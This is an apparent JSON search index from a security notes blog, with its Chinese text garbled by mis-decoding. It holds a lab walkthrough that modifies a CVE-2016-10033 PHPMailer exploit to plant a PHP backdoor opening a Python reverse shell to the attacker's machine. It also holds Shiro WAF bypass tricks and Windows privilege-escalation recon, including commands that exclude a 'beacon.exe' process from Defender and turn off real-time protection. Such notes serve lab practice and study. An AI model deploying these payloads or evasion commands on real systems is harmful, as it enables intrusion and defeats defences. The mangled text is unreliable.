è¿™é‡Œé€‰æ‹©èƒ½RCEçš„php/webapps/40974.pyï¼ŒæŸ¥çœ‹ä¸‹expï¼š\nsearchsploit -x exploits/php/webapps/40974.py åœ¨exploit-dbä¸ŠæŸ¥è¯¢å¯çŸ¥è¯¥æ¼æ´çš„ç¼–å·ä¸ºCVE-2016-10033ï¼Œæ˜¯å› ä¸ºé‚®ä»¶åœ°å€èƒ½å¤ŸåŒ…å«ç”¨å¼•å·æ‹¬èµ·æ¥çš„ç©ºæ ¼ï¼Œè¿™æ ·å¯ä»¥è¿›è¡Œæ”»å‡»å‚æ•°çš„æ³¨å…¥\nè€Œæˆ‘ä»¬é€šè¿‡dirsearchæˆ–ç½‘ç«™ä¸»é¡µä¸Šçœ‹åˆ°çš„é‚®ä»¶é¡µé¢åœ°å€ä¸ºï¼šhttp://192.168.61.135/contact.phpï¼Œå› æ­¤å¯ä»¥å°è¯•æ¼æ´åˆ©ç”¨\næ¼æ´åˆ©ç”¨ï¼ˆflag2ã€flag3ï¼‰ æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠEXPä¸‹è½½åˆ°æ¡Œé¢è¿›è¡Œç¼–è¾‘ï¼š\nsearchsploit -m exploits/php/webapps/40974.py ä¿®æ”¹å†…å®¹å¦‚ä¸‹ï¼š\nå¼€å¤´åŠ ä¸Šï¼š\n#!/usr/bin/python # -*- coding: utf-8 -*- targetå€¼æ”¹ä¸ºhttp://192.168.111.141/contact.php\nbackdoorå€¼æ”¹ä¸ºhoumen.phpï¼ˆé»˜è®¤çš„åå­—å®¹æ˜“è¢«banï¼‰\nä¿®æ”¹payloadå’Œfieldsï¼š\npayload = \u0026#39;\u0026lt;?php system(\\\u0026#39;python -c \u0026#34;\u0026#34;\u0026#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\\u0026#39;[kaliçš„IP]\\\\\\\u0026#39;,[ç›‘å¬çš„ç«¯å£]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\\\\\u0026#34;/bin/sh\\\\\\\u0026#34;,\\\\\\\u0026#34;-i\\\\\\\u0026#34;])\u0026#34;\u0026#34;\u0026#34;\\\u0026#39;); ?\u0026gt;\u0026#39; fields={\u0026#39;action\u0026#39;: \u0026#39;submit\u0026#39;, \u0026#39;name\u0026#39;: payload, \u0026#39;email\u0026#39;: \u0026#39;\u0026#34;anarcoder\\\\\\\u0026#34; -OQueueDirectory=/tmp -X/[webè·¯å¾„]/[åé—¨æ–‡ä»¶åç§°].php server\\\u0026#34; @protonmail.com\u0026#39;, \u0026#39;message\u0026#39;: \u0026#39;Pwned\u0026#39;} "
    }
,
    {
        "title": "wafç¬”è®°",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/waf%E5%AF%B9%E6%8A%97/waf%E7%AC%94%E8%AE%B0/",
        "content": "wafç¬”è®° è®°å½•ä¸€ä¸‹æ”»é˜²æ¼”ç»ƒä¸­wafç›¸å…³è§é—»\nå¸¸è§æ¼æ´é€šç”¨bypass å¸¸è§æ¼æ´ä¸­ä¸€äº›é€šç”¨çš„å€¼å¾—å°è¯•çš„æ–¹æ³•\nshiro ä¸€ä½å¸ˆå‚…è¯´çš„ï¼š\nä¸€éƒ¨åˆ†shiroç›¸å…³wafæœ‰ä¸€ä¸ªæ£€æµ‹æ­¥éª¤ï¼š\nå°†rememberMeçš„å€¼ç”¨æœ€å¸¸è§çš„é»˜è®¤keyå»å°è¯•è§£å¯†ï¼Œç„¶åæŸ¥çœ‹æ˜¯å¦æœ‰æ•æ„Ÿå‚æ•°æ¯”å¦‚å‘½ä»¤æ‰§è¡Œè¯­å¥\næ‰€ä»¥é»˜è®¤keyçš„shiroæ”»å‡»å¾ˆå®¹æ˜“è¢«waf\nå°†è¯·æ±‚åŒ…çš„methodæ”¹ä¸ºéšæœºå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚GETæ”¹ä¸ºxxxxT methodç½®ç©ºï¼Œæ¯”å¦‚ç›´æ¥åˆ æ‰GET è„æ•°æ®ï¼Œåœ¨cookieçš„rememberMe=åé¢å¢åŠ ä¸€äº›ç‰¹æ®Šå­—ç¬¦.æˆ–`ï¼ˆå› ä¸ºshiroå¤„ç†ç‚¹å·ã€åå¼•å·ç­‰ä¼šç›´æ¥å»é™¤ï¼‰ ç©ºç™½å­—æ®µï¼Œåœ¨rememberMe=ä¸­æ·»åŠ \u0026quot;tab\u0026quot;é”è¿›å˜ä¸ºrememberMe\t= Hostå¤´çš„åŸŸåæ”¹ä¸ºIPèƒ½ç»•è¿‡ä¸€éƒ¨åˆ†åªé˜²æŠ¤åŸŸåçš„äº‘waf å¸¸è§waf ç”±äºä¸€ç›´è¯•é€šç”¨çš„bypassæ¯”è¾ƒè´¹æ—¶é—´ï¼Œæ‰€ä»¥è®°ä½ä¸€äº›å¸¸è§wafçš„ç‰¹æ€§è‚¯å®šä¼šäº‹åŠåŠŸå€\nç”µä¿¡äº‘å ¤ æ‰“shiroé‡åˆ°çš„ï¼š\nå¸ˆå‚…è¯´è¿™ä¸ªwafå’Œå¤§éƒ¨åˆ†äº‘waféƒ½æœ‰ä¸ªç‰¹æ€§å°±æ˜¯æœ‰å¯èƒ½åªé˜²æŠ¤äº†åŸŸåï¼Œå¯¹æ­¤çš„bypassæ‰‹æ³•å°±æ˜¯åœ¨è¯·æ±‚åŒ…hostå¤´ä¸­æŠŠåŸŸåæ”¹æˆçœŸå®IP\nå¥‡å®‰ä¿¡ç½‘ç«™å«å£« é»˜è®¤keyæ‰“shiroå¶é‡çš„ï¼Œæ‹¼å°½å…¨åŠ›æ— æ³•æˆ˜èƒœ\n",
        "summary": "wafç¬”è®° è®°å½•ä¸€ä¸‹æ”»é˜²æ¼”ç»ƒä¸­wafç›¸å…³è§é—»\nå¸¸è§æ¼æ´é€šç”¨bypass å¸¸è§æ¼æ´ä¸­ä¸€äº›é€šç”¨çš„å€¼å¾—å°è¯•çš„æ–¹æ³•\nshiro ä¸€ä½å¸ˆå‚…è¯´çš„ï¼š\nä¸€éƒ¨åˆ†shiroç›¸å…³wafæœ‰ä¸€ä¸ªæ£€æµ‹æ­¥éª¤ï¼š\nå°†rememberMeçš„å€¼ç”¨æœ€å¸¸è§çš„é»˜è®¤keyå»å°è¯•è§£å¯†ï¼Œç„¶åæŸ¥çœ‹æ˜¯å¦æœ‰æ•æ„Ÿå‚æ•°æ¯”å¦‚å‘½ä»¤æ‰§è¡Œè¯­å¥\næ‰€ä»¥é»˜è®¤keyçš„shiroæ”»å‡»å¾ˆå®¹æ˜“è¢«waf\nå°†è¯·æ±‚åŒ…çš„methodæ”¹ä¸ºéšæœºå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚GETæ”¹ä¸ºxxxxT methodç½®ç©ºï¼Œæ¯”å¦‚ç›´æ¥åˆ æ‰GET è„æ•°æ®ï¼Œåœ¨cookieçš„rememberMe=åé¢å¢åŠ ä¸€äº›ç‰¹æ®Šå­—ç¬¦.æˆ–`ï¼ˆå› ä¸ºshiroå¤„ç†ç‚¹å·ã€åå¼•å·ç­‰ä¼šç›´æ¥å»é™¤ï¼‰ ç©ºç™½å­—æ®µï¼Œåœ¨rememberMe=ä¸­æ·»åŠ \u0026quot;tab\u0026quot;é”è¿›å˜ä¸ºrememberMe\t= Hostå¤´çš„åŸŸåæ”¹ä¸ºIPèƒ½ç»•è¿‡ä¸€éƒ¨åˆ†åªé˜²æŠ¤åŸŸåçš„äº‘waf å¸¸è§waf ç”±äºä¸€ç›´è¯•é€šç”¨çš„bypassæ¯”è¾ƒè´¹æ—¶é—´ï¼Œæ‰€ä»¥è®°ä½ä¸€äº›å¸¸è§wafçš„ç‰¹æ€§è‚¯å®šä¼šäº‹åŠåŠŸå€\nç”µä¿¡äº‘å ¤ æ‰“shiroé‡åˆ°çš„ï¼š\nå¸ˆå‚…è¯´è¿™ä¸ªwafå’Œå¤§éƒ¨åˆ†äº‘waféƒ½æœ‰ä¸ªç‰¹æ€§å°±æ˜¯æœ‰å¯èƒ½åªé˜²æŠ¤äº†åŸŸåï¼Œå¯¹æ­¤çš„bypassæ‰‹æ³•å°±æ˜¯åœ¨è¯·æ±‚åŒ…hostå¤´ä¸­æŠŠåŸŸåæ”¹æˆçœŸå®IP\nå¥‡å®‰ä¿¡ç½‘ç«™å«å£« é»˜è®¤keyæ‰“shiroå¶é‡çš„ï¼Œæ‹¼å°½å…¨åŠ›æ— æ³•æˆ˜èƒœ\n"
    }
,
    {
        "title": "windowsä¸‹çš„ä¿¡æ¯æ”¶é›†",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E6%8F%90%E6%9D%83/windows%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
        "content": "æƒé™æå‡-windowsä¸‹çš„ä¿¡æ¯æ”¶é›† è¿›å…¥å†…ç½‘åï¼Œå¯ä»¥é€šè¿‡ä¿¡æ¯æ”¶é›†æ‰©å±•æ”»å‡»é¢ï¼Œæ‰¾åˆ°æ›´å¤šå¯èƒ½å¯¼è‡´æƒé™æå‡çš„å…¥å£ç‚¹\næœåŠ¡å™¨ä¿¡æ¯æšä¸¾ ç‰ˆæœ¬ä¿¡æ¯ æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬å·ï¼š\nver æ¶æ„ä¿¡æ¯ è·å–åˆ°æœåŠ¡å™¨æ¶æ„ä¿¡æ¯ï¼Œæœ‰åŠ©äºåç»­é€‰æ‹©å¯¹åº”çš„æ¼æ´åˆ©ç”¨ç¨‹åºæˆ–ç¼–å†™expå’Œpayload\nwmic os get osarchitecture æˆ–\necho %PROCESSOR_ARCHITECTURE% æœåŠ¡ä¿¡æ¯ è·å–æœåŠ¡ä¿¡æ¯å¯ä»¥å¾—çŸ¥ç³»ç»ŸæœåŠ¡çš„è¿›ç¨‹IDã€å¯åŠ¨æ–¹å¼å’ŒçŠ¶æ€ï¼Œæ•ˆæœç±»ä¼¼äºè¿è¡Œservices.msc\nsc query state=all æˆ–\nwmic service list brief powershellå‘½ä»¤è·å–æœåŠ¡åŠæœåŠ¡å¯¹åº”çš„æ‰§è¡Œæ–‡ä»¶è·¯å¾„å’Œå‚æ•°ï¼š\nGet-wmiObject win32_service | select Name,PathName è¿›ç¨‹ä¿¡æ¯ è·å–ç³»ç»Ÿè¿›ç¨‹:\ntasklist è·å–è¿›ç¨‹ä¿¡æ¯:\ntasklist /svc ä½¿ç”¨wmicå‘½ä»¤è·å–ç³»ç»Ÿè¿›ç¨‹ä¿¡æ¯ï¼š\nwmic process list brief ä¹Ÿå¯ä»¥ä½¿ç”¨powershell cmdletå‘½ä»¤ï¼š\nps æˆ–\nGet-WmiObject -Query \u0026#34;select * from Win32_Process\u0026#34; | where {$_.Name -notlike \u0026#34;svchost*\u0026#34;} | Select-Object Name, Handle, @{Label=\u0026#34;Owner\u0026#34;;Expression={$_.GetOwner().User}} | Format-Table -AutoSize é©±åŠ¨ä¿¡æ¯ è·å–å½“å‰ç³»ç»Ÿä¸­å®‰è£…çš„æœåŠ¡å™¨é©±åŠ¨ç¨‹åºä¿¡æ¯ï¼š\ndriverquery æœåŠ¡å™¨é©±åŠ¨ç¨‹åºä¿¡æ¯æœ‰åŠ©äºæˆ‘ä»¬å‘ç°å¯èƒ½å­˜åœ¨æ¼æ´çš„é©±åŠ¨ï¼Œè¿›è€Œå»æœç´¢æ¼æ´åˆ©ç”¨ç¨‹åºè¿›è¡Œææƒ\nç£ç›˜ä¿¡æ¯ è·å–è®¡ç®—æœºçš„å…¨éƒ¨ç£ç›˜ä¿¡æ¯ï¼š\nwmic logicaldisk get caption,description,providername è·å–æŸä¸ªç£ç›˜çš„æ–‡ä»¶å¤¹æ ‘å¹¶å°†ç»“æœè¾“å‡ºåˆ°æ–‡ä»¶å¤¹ä¸­ï¼š\ntree D:\\ \u0026gt;E:\\Desktop\\tree.txt è·å–æŸä¸ªç£ç›˜çš„æ–‡ä»¶åˆ—è¡¨å¹¶å°†ç»“æœè¾“å‡ºåˆ°æ–‡æœ¬æ–‡ä»¶ä¸­ï¼š\ndir /s D:\\ \u0026gt;E:\\Desktop\\tree.txt è¡¥ä¸ä¿¡æ¯ è·å–ç³»ç»Ÿè¡¥ä¸æƒ…å†µï¼š\nwmic qfe get Caption,Description,HotFixID,InstalledOn ä¹Ÿå¯ä»¥ä½¿ç”¨Powershell cmdletå‘½ä»¤ï¼š\nGet-wmiObject -query \u0026#39;select * from win32_quickfixengineering\u0026#39; | foreach {$_.hotfixid} æˆ–\nGet-Hotfix åœ¨è·å–åˆ°ç³»ç»Ÿè¡¥ä¸æƒ…å†µåï¼Œæˆ‘ä»¬èƒ½å¤ŸæŸ¥è¯¢å½“å‰ç³»ç»Ÿæ˜¯å¦å­˜åœ¨æœªä¿®å¤çš„æ¼æ´ï¼Œæœ‰åŠ©äºåˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæœ¬åœ°æƒé™æå‡\nç³»ç»Ÿä¿¡æ¯ è·å–ç³»ç»Ÿä¿¡æ¯ï¼š\nsysteminfo å¦å¤–ï¼Œè®¡ç®—æœºåå¯èƒ½ä¸ç®¡ç†å‘˜çš„ä¸ªäººä¿¡æ¯ã€ä¸ªäººä¹ æƒ¯æˆ–å†…ç½‘æœåŠ¡å™¨çš„å‘½åè§„åˆ™æœ‰å…³ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨cmdå‘½ä»¤è·å–ï¼š\nhostname åº”ç”¨ç¨‹åºä¿¡æ¯ å¯ä»¥ä½¿ç”¨powershell-cmdletå‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿå®‰è£…çš„åº”ç”¨ç¨‹åºä¿¡æ¯\né€šè¿‡æŸ¥è¯¢æ³¨å†Œè¡¨çš„æ–¹å¼ï¼š\nGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name é€šè¿‡åˆ—å‡ºç¨‹åºå®‰è£…æ–‡ä»¶å¤¹çš„æ–¹å¼ï¼š\nGet-ChildItem \u0026#39;C:\\Program Files\u0026#39;,\u0026#39;C:\\Program File (x86)\u0026#39; | ft Parent,Name,LastWriteTime é€šè¿‡è·å–WMIå¯¹è±¡çš„æ–¹å¼ï¼š\nGet-WmiObject -Class Win32_product ä¹Ÿå¯ä»¥æ‰§è¡Œcmdå‘½ä»¤è·å–åº”ç”¨ç¨‹åºä¿¡æ¯ï¼š\nwmic product get name,version TIPS:åœ¨Metasploitçš„meterpreterå‘½ä»¤è¡Œä¸‹ï¼Œå¯ä½¿ç”¨æ¨¡å—post/windows/gather/enum_applicationsæšä¸¾ç³»ç»Ÿä¸­å®‰è£…çš„åº”ç”¨ç¨‹åº\næ£€ç´¢æœåŠ¡å™¨ä¸Šæ˜¯å¦å®‰è£…äº†.NETåŠ.NETçš„ç‰ˆæœ¬ä¿¡æ¯ï¼š\nreg query \u0026#34;HKLM\\Software\\Microsoft\\NET Framework Setup\\NDP\u0026#34; /s /v version | findstr /i version | sort /+26 /r åˆ¤æ–­æœåŠ¡å™¨æ˜¯å¦å®‰è£…äº†PowerShellï¼ŒæŸ¥çœ‹PowerShellå¼•æ“ç‰ˆæœ¬ä¿¡æ¯\nreg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine\u0026#34; /v PowerShellVersion åœ¨è·å–åˆ°ç³»ç»Ÿä¿¡æ¯åº”ç”¨ç¨‹åºçš„å®‰è£…æƒ…å†µåï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥è¯¢æ˜¯å¦å­˜åœ¨å¯èƒ½æœ‰æ¼æ´çš„åº”ç”¨ç¨‹åºï¼Œæˆ–è·å–æœ‰æ›´å¤šæ•æ„Ÿç³»ç»Ÿä¿¡æ¯çš„ç¬¬ä¸‰æ–¹åº”ç”¨ï¼Œæœ‰åŠ©äºæå‡æƒé™\nè®¡åˆ’ä»»åŠ¡ä¿¡æ¯ è·å–æœåŠ¡å™¨çš„è®¡åˆ’ä»»åŠ¡ä¿¡æ¯ï¼š\nschtasks /query /fo LIST /v\t#æŸ¥çœ‹å…¨éƒ¨è®¡åˆ’ä»»åŠ¡ schtasks /query /fo LIST /v | findstr /v \u0026#34;\\Microsoft\u0026#34;\t#æ’é™¤é»˜è®¤çš„windowsä»»åŠ¡ ä¹Ÿå¯ä»¥æ‰§è¡Œpowershell cmdletå‘½ä»¤è·å–è®¡åˆ’ä»»åŠ¡ä¿¡æ¯ï¼š\nGet-ScheduledTask\t#æŸ¥çœ‹å…¨éƒ¨è®¡åˆ’ä»»åŠ¡ Get-ScheduledTask | where {$_.TaskPath -notlike \u0026#34;\\Microsoft*\u0026#34;} | ft TaskName,TaskPath,State,Author\t#æ’é™¤é»˜è®¤çš„windowsä»»åŠ¡ è·å–åˆ°æœåŠ¡å™¨çš„è®¡åˆ’ä»»åŠ¡æƒ…å†µåï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥å½“å‰ç”¨æˆ·å¯¹æŸäº›é«˜æƒé™ç”¨æˆ·è¿è¡Œçš„è®¡åˆ’ä»»åŠ¡æ‰€å¯¹åº”çš„ç›®å½•æˆ–æ–‡ä»¶æ˜¯å¦å…·æœ‰ä¿®æ”¹æƒé™ï¼Œè‹¥æœ‰ä¿®æ”¹æƒé™ï¼Œå¯ä»¥å°†ç›®æ ‡ç¨‹åºæ›¿æ¢ä¸ºåé—¨ç¨‹åºï¼Œä»è€Œå®ç°æƒé™æå‡\nå¼€æœºå¯åŠ¨ä¿¡æ¯ è·å–å¼€æœºå¯åŠ¨é¡¹æ–‡ä»¶ï¼š\nwmic startup get caption,command,location è·å–æŸä¸ªç”¨æˆ·çš„å¼€æœºå¯åŠ¨é¡¹æ–‡ä»¶å¤¹ï¼š\ndir \u0026#34;C:\\Users\\\u0026lt;ç”¨æˆ·å\u0026gt;\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0026#34; åˆ—å‡ºå¯¹æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰æ•ˆçš„å¼€æœºå¯åŠ¨é¡¹æ–‡ä»¶å¤¹ï¼š\ndir \u0026#34;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0026#34; æŸ¥çœ‹æ³¨å†Œè¡¨ä¸­çš„å¼€æœºå¯åŠ¨é¡¹ï¼š\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run æŸ¥è¯¢åˆ°å¼€æœºå¯åŠ¨é¡¹æ–‡ä»¶å¤¹æˆ–æ³¨å†Œè¡¨ä¸­çš„å¼€æœºå¯åŠ¨é¡¹æ–‡ä»¶ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹å½“å‰ç”¨æˆ·æ˜¯å¦å¯¹è¿™äº›æ–‡ä»¶æœ‰å†™å…¥æˆ–ä¿®æ”¹ç­‰æƒé™ï¼Œæ¥åˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿæƒé™æå‡\nç¯å¢ƒå˜é‡ä¿¡æ¯ ç¯å¢ƒå˜é‡æ˜¯è®¡ç®—æœºä¸­ä¸€ä¸ªåŠ¨æ€â€œå¯¹è±¡â€œï¼ŒåŒ…å«å¯ç¼–è¾‘çš„å€¼ï¼Œç”¨äºå­˜å‚¨æœ‰å…³æ“ä½œç³»ç»Ÿç¯å¢ƒçš„ä¿¡æ¯ï¼ˆæ¯”å¦‚ç³»ç»Ÿè·¯å¾„ã€åº”ç”¨ç¨‹åºè®¾ç½®ã€ç³»ç»Ÿå‚æ•°ç­‰ï¼‰ï¼Œå¯ä»¥è¢«ç³»ç»Ÿä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªè½¯ä»¶ä½¿ç”¨ï¼Œç”¨æ¥å¸®åŠ©åº”ç”¨ç¨‹åºäº†è§£æ–‡ä»¶çš„å®‰è£…ä½ç½®ã€ä¸´æ—¶æ–‡ä»¶çš„å­˜å‚¨ä½ç½®ç­‰\né€šè¿‡ä½¿ç”¨ç¯å¢ƒå˜é‡ï¼Œæ“ä½œç³»ç»Ÿå’Œè½¯ä»¶å¯ä»¥æ›´å¥½çš„äº¤äº’ï¼Œä»è€Œæé«˜æ•´ä½“çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§\nè·å–ç¯å¢ƒå˜é‡ï¼š\nset ä½¿ç”¨powershell cmdletå‘½ä»¤è·å–ç¯å¢ƒå˜é‡ä¿¡æ¯\nGet-ChildItem Env: | ft Key,Value æˆ–\ndir env: ç½‘ç»œä¿¡æ¯æšä¸¾ IPä¿¡æ¯ ä½¿ç”¨cmdè·å–æœ¬æœºIPåœ°å€ã€DNSã€ç½‘å…³ç­‰é…ç½®ä¿¡æ¯ï¼š\nipconfig/all ç«¯å£ä¿¡æ¯ æŸ¥çœ‹è®¡ç®—æœºå½“å‰çš„ç½‘ç»œçŠ¶æ€å’Œç›‘å¬çš„ç«¯å£ä»¥åŠç›¸åº”çš„è¿›ç¨‹IDï¼š\nnetstat -ano -a å‚æ•°æ˜¾ç¤ºè®¡ç®—æœºæ‰€æœ‰çš„è¿æ¥å’Œç›‘å¬ç«¯å£ -n å‚æ•°ä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€å’Œç«¯å£å· -o å‚æ•°æ˜¾ç¤ºä¸æ¯ä¸ªè¿æ¥ç›¸å…³çš„è¿›ç¨‹ID ç½‘ç»œæ¥å£ä¿¡æ¯ powershell cmdletå‘½ä»¤è·å–è®¡ç®—æœºçš„ç½‘ç»œé€‚é…å™¨åç§°ã€æè¿°ã€IPåœ°å€å’ŒIPæ®µï¼š\nGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address è·¯ç”±ä¿¡æ¯ è·¯ç”±è¡¨æ˜¯ä¸€ç§ç”±ç½‘ç»œè·¯ç”±å™¨ä½¿ç”¨çš„æ•°æ®ç»“æ„ï¼Œç”¨äºå­˜å‚¨ç½‘ç»œè·¯å¾„çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç›®çš„åœ°å€ã€ç½‘å…³åœ°å€ã€æ¥å£ä»¥åŠè·¯ç”±æ ‡å¿—ç­‰ï¼›é€šè¿‡æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„è·¯ç”±è¡¨ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬äº†è§£ç³»ç»Ÿçš„è·¯ç”±å™¨æƒ…å†µ\nè·å–è·¯ç”±è¡¨ä¿¡æ¯ï¼š\nroute print ä¹Ÿå¯ä»¥æ‰§è¡Œpowershell cmdletå‘½ä»¤è·å–è·¯ç”±è¡¨ä¿¡æ¯\nGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex å…±äº«ä¿¡æ¯ æ˜¾ç¤ºæˆ–é…ç½®å½“å‰è®¡ç®—æœºçš„å…±äº«èµ„æºï¼ŒåŒ…æ‹¬å…±äº«æ–‡ä»¶å¤¹ï¼Œæ‰“å°æœºç­‰\nnet share æˆ–\nwmic share get name,path,status,caption ä¹Ÿå¯ä»¥ä½¿ç”¨metasploitçš„post/windows/gather/enum_sharesæ¨¡å—è·å–å…±äº«ä¿¡æ¯\nç”¨æˆ·ä¿¡æ¯æšä¸¾ å½“å‰ç”¨æˆ·ä¿¡æ¯ æ‰§è¡Œcmdå‘½ä»¤ â€œwhoami /allâ€ï¼ŒæŸ¥çœ‹å½“å‰ç”¨æˆ·åã€SIDã€æ‰€å±ç»„ã€æƒé™åˆ†é…ä¿¡æ¯\nå€¼å¾—æ³¨æ„çš„æ˜¯ç»„åä¸­çš„ â€œMandatory Labelâ€ï¼Œæ„æ€æ˜¯â€œå¼ºåˆ¶æ€§æ ‡ç­¾â€ï¼›åœ¨windowsç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªæ ‡ç­¾è¡¨ç¤ºè¿›ç¨‹è¿è¡Œçš„å®Œæ•´æ€§çº§åˆ«ï¼Œçº§åˆ«ä»ä½åˆ°é«˜ä¾æ¬¡ä¸ºï¼š\nUntrust Low Medium High System çº§åˆ«è¶Šä½ï¼Œæƒé™è¶Šä½\næ‰€æœ‰ç”¨æˆ·/ç»„ä¿¡æ¯ æŸ¥çœ‹æœåŠ¡å™¨ä¸Šæ‰€æœ‰ç”¨æˆ·è´¦æˆ·ï¼ˆä¸èƒ½åˆ—å‡ºç”¨æˆ·åç»“å°¾æ·»åŠ äº†â€œ$â€ç¬¦å·çš„éšè—ç”¨æˆ·ï¼‰ï¼š\nnet user powershell cmdletå‘½ä»¤è·å–æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬éšè—è´¦æˆ·ã€æ˜¯å¦å¯ç”¨ã€ä¸Šæ¬¡ç™»å½•æ—¶é—´ï¼š\nGet-LocalUser | ft Name,Enable,LastLogon é€šè¿‡æ³¨å†Œè¡¨æŸ¥çœ‹æœåŠ¡å™¨ä¸­çš„ç”¨æˆ·è´¦æˆ·ï¼š\nreg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\u0026#34; æ‰§è¡Œä¸Šé¢çš„å‘½ä»¤ï¼Œåœ¨æ¯è¡Œè´¦æˆ·çš„æœ«å°¾éƒ½å­˜åœ¨SIDï¼Œå¯ä»¥æ ¹æ®SIDæŸ¥çœ‹ç”¨æˆ·åï¼š\nreg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\\u0026lt;ç”¨æˆ·SID\u0026gt;\u0026#34; /v ProfileImagePath åˆ—å‡ºC:\\Users\\æ–‡ä»¶å¤¹ä¸‹çš„ç›®å½•ä¹Ÿå¯ä»¥æŸ¥çœ‹æœåŠ¡å™¨ä¸Šå­˜åœ¨çš„ç”¨æˆ·ï¼š\nGet-ChildItem C:\\Users -Force | select Name cmdå‘½ä»¤æŸ¥çœ‹æœåŠ¡å™¨æ‰€æœ‰ç”¨æˆ·ç»„ï¼š\nnet localgroup powershell cmdletå‘½ä»¤æŸ¥çœ‹ç”¨æˆ·ç»„ï¼š\nGet-LocalGroup cmdå‘½ä»¤è·å–æŸä¸ªç”¨æˆ·ä¿¡æ¯ï¼š\nnet user \u0026lt;ç”¨æˆ·å\u0026gt; è·å–æŸä¸ªç»„é‡Œæœ‰å“ªäº›ç”¨æˆ·ï¼š\nnet Localgroup \u0026lt;ç»„å\u0026gt; powershellå‘½ä»¤è·å–ç»„ä¸­çš„ç”¨æˆ·ï¼š\nGet-LocalGroupMember \u0026lt;ç»„å\u0026gt; | ft Name, PrincipalSource åœ¨çº¿ç”¨æˆ·ä¿¡æ¯ cmdå‘½ä»¤è·å–å½“å‰åœ¨çº¿ç”¨æˆ·ã€çŠ¶æ€ã€ç©ºé—²æ—¶é—´å’Œç™»å½•æ—¶é—´ç­‰ä¿¡æ¯ï¼š\nquery user æˆ–\nqwinsta è·å–åœ¨çº¿ç”¨æˆ·ä¿¡æ¯ï¼Œæœ‰åŠ©äºæ¸—é€æµ‹æµ‹è¯•äººå‘˜æŒæ¡ç®¡ç†å‘˜çš„å·¥ä½œæ—¶é—´ï¼Œä»¥è§„é¿åœ¨ç®¡ç†å‘˜åœ¨çº¿æ—¶è¿›è¡Œææƒç­‰æ“ä½œ\nç”¨æˆ·ç­–ç•¥ä¿¡æ¯ cmdå‘½ä»¤è·å–ç”¨æˆ·ç­–ç•¥ä¿¡æ¯ï¼š\nnet accounts è·å–ç”¨æˆ·ç­–ç•¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬å¯†ç é”å®šé˜ˆå€¼ç­‰ï¼Œæœ‰åŠ©äºçˆ†ç ´ç­‰æ“ä½œ\né˜²æŠ¤è½¯ä»¶æšä¸¾ é˜²ç«å¢™çŠ¶æ€ è·å–ç³»ç»Ÿé˜²ç«å¢™ç­–ç•¥åŠçŠ¶æ€\nnetsh advfirewall show allprofiles ä½¿ç”¨powershellå‘½ä»¤åˆ—å‡ºé˜²ç«å¢™é˜»æ­¢çš„æ‰€æœ‰ç«¯å£ï¼š\n$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules | where {$_.action -eq \u0026#34;0\u0026#34;} | select name,applicationname,localports windows defenderçŠ¶æ€ powershell cmdletè·å–ç³»ç»Ÿwindows defenderçŠ¶æ€ï¼š\nGet-MpComputerStatus å¸¸è§å­—æ®µå«ä¹‰ï¼š\nAntivirusEnabled:é˜²ç—…æ¯’è½¯ä»¶æ˜¯å¦å¯ç”¨ RealTimeProtectionEnabledï¼šå®æ—¶ä¿æŠ¤æ˜¯å¦å·²å¼€å¯ powershell cmdetæ·»åŠ æ£€æŸ¥æ’é™¤é¡¹ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™æ‰§è¡Œï¼‰ï¼š\nAdd-MpPreference -ExclusionPath \u0026#34;C:\\Temp\u0026#34;\t#æ’é™¤æ–‡ä»¶å¤¹ Set-MpPreference -ExclusionProcess \u0026#34;beacon.exe\u0026#34;\t#æ’é™¤æŸè¿›ç¨‹ powershell cmdetå…³é—­windows defenderå®æ—¶ä¿æŠ¤ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™æ‰§è¡Œï¼Œä¸”å·²å…³é—­ç¯¡æ”¹é˜²æŠ¤ï¼‰ï¼š\nSet-MpPreference -DisableRealtimeMonitoring $true å¸¸è§çš„é˜²æŠ¤è½¯ä»¶è¿›ç¨‹ 